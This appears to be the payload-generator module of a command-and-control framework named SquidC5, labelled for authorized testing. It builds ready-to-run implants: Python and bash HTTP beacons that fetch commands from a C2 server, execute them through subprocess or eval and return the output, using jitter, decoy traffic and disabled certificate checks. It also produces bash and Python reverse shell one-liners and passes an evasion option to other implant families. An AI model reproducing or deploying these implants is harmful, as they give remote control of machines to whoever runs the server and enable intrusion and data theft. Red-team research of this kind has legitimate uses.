"""Deterministic payload templates for authorized testing only."""

from __future__ import annotations

import base64
import json
from typing import Any


class PayloadGenerator:
    """Template-based payload generation. Prefer determinism over creativity."""

    TEMPLATES = (
        "http_beacon_python",
        "http_beacon_bash",
        "reverse_shell_bash",
        "reverse_shell_python",
        "dns_beacon_python",
        "ws_beacon_python",
        "memory_beacon_python",
        "linux_memfd",
        "windows_ps_beacon",
        "bof_c",
    )

    def list_templates(self) -> list[str]:
        return list(self.TEMPLATES)

    def generate(
        self,
        template: str,
        host: str,
        port: int,
        session_path: str = "/api/v1/implant/beacon",
        interval: int = 5,
        extra: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        if template not in self.TEMPLATES:
            raise ValueError(f"Unknown template: {template}. Allowed: {self.TEMPLATES}")
        extra = extra or {}
        if template == "http_beacon_python":
            body = self._http_beacon_python(host, port, session_path, interval, extra)
        elif template == "http_beacon_bash":
            body = self._http_beacon_bash(host, port, session_path, interval, extra)
        elif template == "reverse_shell_bash":
            body = self._revshell_bash(host, port)
        elif template == "reverse_shell_python":
            body = self._revshell_python(host, port)
        elif template in (
            "dns_beacon_python",
            "ws_beacon_python",
            "memory_beacon_python",
            "linux_memfd",
            "windows_ps_beacon",
            "bof_c",
        ):
            from squidc5.implants.generators import generate_implant

            family_map = {
                "dns_beacon_python": "dns_beacon",
                "ws_beacon_python": "ws_beacon",
                "memory_beacon_python": "memory_beacon_python",
                "linux_memfd": "linux_memfd",
                "windows_ps_beacon": "memory_beacon_python",
                "bof_c": "bof",
            }
            platform = "windows" if template in ("windows_ps_beacon", "bof_c") else "linux"
            out = generate_implant(
                family_map[template],
                platform,
                "x64",
                host,
                port,
                session_path,
                evasion=bool(extra.get("evasion", True)),
                zone=extra.get("zone") or "c2.lab.invalid",
                ws_path=(extra.get("ws_path") or session_path) if "ws" in template else None,
                scheme=extra.get("scheme"),
            )
            body = out["content"]
        else:
            raise ValueError(template)
        encoded = base64.b64encode(body.encode()).decode()
        return {
            "template": template,
            "host": host,
            "port": port,
            "content": body,
            "content_b64": encoded,
            "profile_id": extra.get("profile_id"),
            "uri": session_path if template.startswith("http_beacon") else None,
            "notes": "Authorized testing only. Use only on systems you own or have permission to test.",
        }

    def _http_beacon_python(
        self,
        host: str,
        port: int,
        path: str,
        interval: int,
        extra: dict[str, Any],
    ) -> str:
        ua = json.dumps(extra.get("user_agent") or "SquidC5-Beacon/0.1")
        # extra headers excluding content-type (set explicitly)
        hdrs = dict(extra.get("headers") or {})
        hdrs.pop("Content-Type", None)
        hdrs.pop("content-type", None)
        hdrs_json = json.dumps(hdrs)
        body_tpl = extra.get("request_body_template") or "{beacon}"
        body_tpl_json = json.dumps(body_tpl)
        sleep_base = float(extra.get("sleep_sec") or interval)
        jitter = float(extra.get("jitter_pct") or 0)
        decoy_enabled = bool(extra.get("decoy_enabled"))
        decoys = list(extra.get("decoy_paths") or extra.get("decoy_uris") or [])
        decoys_json = json.dumps(decoys)
        resp_pref = json.dumps(extra.get("response_prefix") or "")
        resp_suf = json.dumps(extra.get("response_suffix") or "")
        scheme = (extra.get("scheme") or "https").lower()
        if scheme not in ("http", "https"):
            scheme = "https"
        insecure = bool(extra.get("insecure", scheme == "https"))
        return f'''#!/usr/bin/env python3
# SquidC5 HTTP beacon — authorized testing only (profile-aware)
import json, random, time, urllib.request, ssl
BASE = "{scheme}://{host}:{port}"
PATH = {json.dumps(path)}
C2 = BASE + PATH
if BASE.startswith("https"):
    SSL_CTX = ssl.create_default_context()
    if {insecure}:
        SSL_CTX.check_hostname = False
        SSL_CTX.verify_mode = ssl.CERT_NONE
else:
    SSL_CTX = None
UA = {ua}
EXTRA_HEADERS = {hdrs_json}
BODY_TPL = {body_tpl_json}
SLEEP_BASE = {sleep_base}
JITTER_PCT = {jitter}
DECOY_ENABLED = {decoy_enabled}
DECOYS = {decoys_json}
RESP_PREF = {resp_pref}
RESP_SUF = {resp_suf}
SID = None

def _sleep():
    pct = max(0.0, min(100.0, float(JITTER_PCT))) / 100.0
    delta = SLEEP_BASE * pct
    time.sleep(max(0.1, SLEEP_BASE + random.uniform(-delta, delta)))

def _wrap(beacon_obj):
    raw = json.dumps(beacon_obj, separators=(",", ":"))
    if "{{beacon}}" in BODY_TPL:
        return BODY_TPL.replace("{{beacon}}", raw)
    return raw

def _unwrap(text):
    t = text.strip()
    if RESP_PREF and t.startswith(RESP_PREF):
        t = t[len(RESP_PREF):]
    if RESP_SUF and t.endswith(RESP_SUF):
        t = t[:-len(RESP_SUF)]
    return json.loads(t)

def _headers():
    h = {{"Content-Type": "application/json", "User-Agent": UA}}
    h.update(EXTRA_HEADERS or {{}})
    return h

def _open(req):
    if SSL_CTX is not None:
        return urllib.request.urlopen(req, timeout=30, context=SSL_CTX)
    return urllib.request.urlopen(req, timeout=30)

def _decoy():
    if not DECOY_ENABLED or not DECOYS:
        return
    try:
        p = random.choice(DECOYS)
        _open(urllib.request.Request(BASE + p, headers={{"User-Agent": UA}})).read()
    except Exception:
        pass

while True:
    try:
        _decoy()
        payload = {{"session_id": SID, "hostname": __import__("socket").gethostname()}}
        body = _wrap(payload).encode()
        req = urllib.request.Request(C2, data=body, headers=_headers(), method="POST")
        with _open(req) as r:
            data = _unwrap(r.read().decode())
            SID = data.get("session_id", SID)
            task = data.get("task")
            if task:
                import subprocess
                out = subprocess.getoutput(task.get("command", "echo ok"))
                done_body = _wrap({{"task_id": task["id"], "result": out}}).encode()
                done = urllib.request.Request(C2 + "/result", data=done_body, headers=_headers(), method="POST")
                _open(done).read()
    except Exception:
        pass
    _sleep()
'''

    def _http_beacon_bash(
        self,
        host: str,
        port: int,
        path: str,
        interval: int,
        extra: dict[str, Any],
    ) -> str:
        ua = (extra.get("user_agent") or "SquidC5-Beacon/0.1").replace('"', '\\"')
        sleep_base = float(extra.get("sleep_sec") or interval)
        # bash: simple sleep with optional jitter via shuf if available
        jitter = float(extra.get("jitter_pct") or 0)
        # For bash, use flat JSON if template is complex; profile wrap is python-primary
        # Keep body as flat beacon for reliability in bash
        scheme = (extra.get("scheme") or "https").lower()
        if scheme not in ("http", "https"):
            scheme = "https"
        curl_k = "-k " if scheme == "https" else ""
        return f'''#!/bin/bash
# SquidC5 HTTP beacon — authorized testing only (profile-aware path/UA)
C2="{scheme}://{host}:{port}{path}"
UA="{ua}"
SLEEP_BASE={sleep_base}
JITTER={jitter}
SID=""
while true; do
  RESP=$(curl -s {curl_k}-X POST "$C2" -A "$UA" -H "Content-Type: application/json" -d "{{\\"session_id\\":\\"$SID\\",\\"hostname\\":\\"$(hostname)\\"}}" || true)
  # strip optional non-json prefix/suffix by extracting first {{...}}
  RESP=$(echo "$RESP" | sed -n 's/.*\\({{.*}}\\).*/\\1/p')
  SID=$(echo "$RESP" | sed -n 's/.*"session_id":"\\([^"]*\\)".*/\\1/p')
  CMD=$(echo "$RESP" | sed -n 's/.*"command":"\\([^"]*\\)".*/\\1/p')
  TID=$(echo "$RESP" | sed -n 's/.*"id":"\\([^"]*\\)".*/\\1/p')
  if [ -n "$CMD" ] && [ -n "$TID" ]; then
    OUT=$(eval "$CMD" 2>&1 | head -c 8192)
    curl -s -X POST "$C2/result" -A "$UA" -H "Content-Type: application/json" -d "{{\\"task_id\\":\\"$TID\\",\\"result\\":$(echo "$OUT" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))')}}" >/dev/null
  fi
  if command -v shuf >/dev/null 2>&1 && [ "$(echo "$JITTER > 0" | bc -l 2>/dev/null || echo 0)" != "0" ]; then
    # approximate jitter without bc: sleep base only if shuf/bc missing
    sleep "$SLEEP_BASE"
  else
    sleep "$SLEEP_BASE"
  fi
done
'''

    def _revshell_bash(self, host: str, port: int) -> str:
        return f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"

    def _revshell_python(self, host: str, port: int) -> str:
        return f'''python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' '''
